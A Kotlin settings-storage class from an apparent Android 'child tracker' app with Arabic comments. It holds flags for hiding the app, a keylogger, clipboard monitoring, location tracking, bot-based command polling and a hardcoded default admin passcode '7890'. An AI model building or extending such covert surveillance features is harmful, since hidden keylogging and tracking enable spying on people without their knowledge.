package com.abuzahra.tracker

import android.content.Context

/**
 * SharedPrefsManager - إدارة التفضيلات المشتركة
 * يحفظ بيانات الربط بين الجهاز والبوت + حالة التفعيل
 * ملاحظة: لا يوجد علم "permissions_granted" - الأذونات لا يتم تخطيها أبداً
 */
object SharedPrefsManager {
    private const val PREFS_NAME = "child_prefs"

    // ==================== بيانات الربط ====================

    fun saveData(ctx: Context, parentUid: String, deviceId: String) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putString("parent_uid", parentUid)
            putString("device_id", deviceId)
            apply()
        }
    }

    fun getParentUid(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getString("parent_uid", null)

    fun getDeviceId(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getString("device_id", null)

    fun setDeviceId(ctx: Context, id: String) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putString("device_id", id)
            apply()
        }
    }

    // ==================== بيانات سيرفر البوت ====================

    fun setLinkCode(ctx: Context, code: String) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putString("link_code", code)
            apply()
        }
    }

    fun getLinkCode(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getString("link_code", null)

    fun setBotRegistered(ctx: Context, registered: Boolean) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putBoolean("bot_registered", registered)
            apply()
        }
    }

    fun isBotRegistered(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getBoolean("bot_registered", false)

    fun setBotToken(ctx: Context, token: String) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putString("bot_token", token)
            apply()
        }
    }

    fun getBotToken(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getString("bot_token", null)

    fun setLastHeartbeat(ctx: Context, timestamp: Long) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putLong("last_heartbeat", timestamp)
            apply()
        }
    }

    fun getLastHeartbeat(ctx: Context): Long =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getLong("last_heartbeat", 0)

    fun setLastCommandCheck(ctx: Context, timestamp: Long) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putLong("last_command_check", timestamp)
            apply()
        }
    }

    fun getLastCommandCheck(ctx: Context): Long =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getLong("last_command_check", 0)

    // ==================== استمرارية الجلسة ====================

    /**
     * حفظ علامة اكتمال التفعيل
     * يُستدعى فقط عند اكتمال جميع مراحل الأذونات + كود الربط الصحيح
     */
    fun markSetupCompleted(ctx: Context) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putBoolean("setup_completed", true)
            putLong("setup_completed_at", System.currentTimeMillis())
            apply()
        }
    }

    fun isSetupCompleted(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getBoolean("setup_completed", false)

    fun getSetupCompletedAt(ctx: Context): Long =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getLong("setup_completed_at", 0)

    fun resetSetupCompleted(ctx: Context) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putBoolean("setup_completed", false)
            remove("setup_completed_at")
            apply()
        }
    }

    // ==================== إعدادات التطبيق ====================

    fun setAppHidden(ctx: Context, hidden: Boolean) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putBoolean("app_hidden", hidden)
            apply()
        }
    }

    fun isAppHidden(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getBoolean("app_hidden", false)

    fun setAdminPasscode(ctx: Context, passcode: String) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putString("admin_passcode", passcode)
            apply()
        }
    }

    fun getAdminPasscode(ctx: Context): String? =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getString("admin_passcode", "7890")

    // ==================== إعدادات المراقبة ====================

    fun setKeyloggerEnabled(ctx: Context, enabled: Boolean) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putBoolean("keylogger_enabled", enabled)
            apply()
        }
    }

    fun isKeyloggerEnabled(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getBoolean("keylogger_enabled", false)

    fun setClipboardMonitorEnabled(ctx: Context, enabled: Boolean) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putBoolean("clipboard_monitor", enabled)
            apply()
        }
    }

    fun isClipboardMonitorEnabled(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getBoolean("clipboard_monitor", false)

    fun setLocationTrackingEnabled(ctx: Context, enabled: Boolean) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putBoolean("location_tracking", enabled)
            apply()
        }
    }

    fun isLocationTrackingEnabled(ctx: Context): Boolean =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getBoolean("location_tracking", true)

    fun setSyncInterval(ctx: Context, seconds: Int) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putInt("sync_interval", seconds)
            apply()
        }
    }

    fun getSyncInterval(ctx: Context): Int =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getInt("sync_interval", 300)

    fun setLocationInterval(ctx: Context, seconds: Int) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putInt("location_interval", seconds)
            apply()
        }
    }

    fun getLocationInterval(ctx: Context): Int =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getInt("location_interval", 60)

    // ==================== حظر التطبيقات ====================

    fun setBlockedApps(ctx: Context, apps: Set<String>) {
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).edit().apply {
            putStringSet("blocked_apps", apps)
            apply()
        }
    }

    fun getBlockedApps(ctx: Context): Set<String> =
        ctx.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE).getStringSet("blocked_apps", emptySet()) ?: emptySet()

    fun addBlockedApp(ctx: Context, packageName: String) {
        val current = getBlockedApps(ctx).toMutableSet()
        current.add(packageName)
        setBlockedApps(ctx, current)
    }

    fun removeBlockedApp(ctx: Context, packageName: String) {
        val current = getBlockedApps(ctx).toMutableSet()
        current.remove(packageName)
        setBlockedApps(ctx, current)
    }
}
